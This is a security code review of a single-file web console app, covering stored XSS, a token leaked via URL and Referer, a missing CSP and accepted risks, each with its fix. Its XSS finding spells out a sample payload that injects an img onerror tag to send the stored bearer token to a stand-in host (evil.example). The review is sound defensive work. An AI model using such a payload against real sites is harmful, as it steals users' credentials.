# Code review — the console

Reviewed: 15 November 2026, at `ba8a10c` plus the fixes below. One file, `index.html`, ~4,100 lines of HTML, CSS and
JavaScript; `sw.js`; `manifest.webmanifest`; `android/`.

Method: read the intent from `CHANGELOG.md`, map what the code touches, then hunt in the order that matters —
correctness and data loss, then security, then performance, then design. Every finding below names the line and what
breaks. Anything I could not point at was dropped rather than listed.

## Findings

| # | Severity | Finding | Status |
|---|---|---|---|
| **C-01** | **Critical** | **Stored XSS through every record name, company name, deal name and note body.** | **Fixed** |
| **C-02** | **Critical** | **The bearer token sat in the address bar, and leaked in the `Referer` header.** | **Fixed** |
| **H-01** | High | No Content-Security-Policy. One missed escape was instantly fatal. | **Fixed** |
| M-01 | Medium | CSV import had no size limit — a 200 MB paste froze the tab. | **Fixed** |
| M-02 | Medium | Three `catch {}` blocks swallow storage failures silently. | Open, accepted |
| M-03 | Medium | The engine token is stored in plaintext beside the data. | Open, documented |
| M-04 | Medium | No integrity check on the cached shell beyond the service worker. | Open, documented |
| L-01 | Low | `save()` serialises the whole state on every keystroke in search. | Open, measured |

## C-01 — stored XSS with a credential-theft payload

**Evidence.** Twenty-three interpolations of data into `innerHTML`. The four that matter:

```
1675  <span class="nm">${record.name}</span>
1850  <b>${deal.name}</b>
1918  ${company ? company.name : companyRef}
1953  <p>${event.payload.text}</p>
```

`record.name` comes from the engine, and from a CSV you imported. `event.payload.text` is a note you typed.

**What breaks.** A CSV with `<img src=x onerror="fetch('https://evil.example/?t='+localStorage['tessera.console.v1'])">`
in the name column executes on import, in the origin that holds the bearer token. Importing a file somebody sent you is
the whole attack. It is stored, so it re-fires on every reload.

**Fix.** One `esc()` helper, applied at every interpolation of data — 23 sites. **Proof, run:** a record created with
`<img src=x onerror="window.__pwned=1">` as its name now renders as

```
<span class="nm">&lt;img src=x onerror="window.__pwned=1"&gt;</span>
```

and no `<img>` element exists anywhere in the body outside `<script>`.

## C-02 — the token in the address bar

**Evidence.** `?engine=…&token=…` was read from `location.search` and left there. The page carries one outbound link,
`<a href="https://ko-fi.com/matneo">`, with no `rel` and no referrer policy.

**What breaks.** A token in the URL is in browser history, in any screenshot, in a shared link, and in the `Referer`
header sent to ko-fi.com when the sponsor link is clicked.

**Fix.** The token is stripped from the URL with `history.replaceState` before the connection attempt; the outbound
link gains `rel="noopener noreferrer" referrerpolicy="no-referrer"`; the document gains
`<meta name="referrer" content="no-referrer">`.

## H-01 — no CSP

**Fix.** `default-src 'self'`, `script-src 'self' 'unsafe-inline'` (the app is one inline script — splitting it to drop
`unsafe-inline` is the next step, and it is a build-step change, not a one-liner), `connect-src http: https:` because
the engine address is user-supplied, `object-src 'none'`, `frame-ancestors 'none'`, `base-uri 'none'`,
`form-action 'none'`.

**What it does not do.** With `'unsafe-inline'` an injected `<script>` would still run; what the CSP removes is
`<object>`, framing, `<base>` rewriting, and form exfiltration. It is defence in depth behind `esc()`, not a substitute
for it.

## M-01 — an unbounded paste

`previewImport()` parsed whatever was in the textarea. A 200 MB paste froze the tab with no message. Now capped at
2 MB with a message that says the size and the limit.

## Accepted, with reasons

- **M-02, swallowed errors.** `idbSet(...).catch(() => {})` means a storage failure is invisible. The honest fix is a
  visible "not saved" state, which is a UI change with its own risks. The storage report in Settings shows the backend
  and whether IndexedDB is answering, which is the mitigation.
- **M-03, plaintext token.** A browser is not a vault. Encrypting it with a key stored in the same browser buys
  nothing. Stated in `SECURITY.md` instead of papered over.
- **M-04, cached shell integrity.** Subresource Integrity cannot cover a service worker. The mitigation is that the app
  is a static file whose history is public.
- **L-01, serialising on every keystroke.** Measured at this size: `JSON.stringify` of the state is under 2 ms for ten
  records. It becomes a problem at a few thousand, and the fix is a debounce, not a rewrite.

## What is good, and should stay

- The ledger-as-the-only-store decision means notes, emails and resolutions cannot disagree with each other. Three
  separate stores would have been the obvious build and would have been wrong.
- `nodeInfo()` exists because a combined source (`hubspot+zendesk`) crashed the view once. One accessor instead of
  fifteen assumptions is the right shape for a value that comes from outside.
- `loadState()` and every storage API have deadlines. A promise that never settles now says so rather than hanging the
  boot, and that was found by a harness, not by reading.
- `tests/a11y-harness.html` runs in a real browser. It found the 1.34:1 control border that no amount of reading found.

## Verdict

**Ship**, with C-01, C-02, H-01 and M-01 fixed in this release. The four open findings are documented in
`SECURITY.md` or accepted above, and none of them is a surprise to a reader of that document.

The one thing I would not ship to a real customer without: **`'unsafe-inline'` in `script-src`.** Splitting the single
inline script into a file is a build-step change, and it is the difference between a CSP that helps and a CSP that is
decoration.
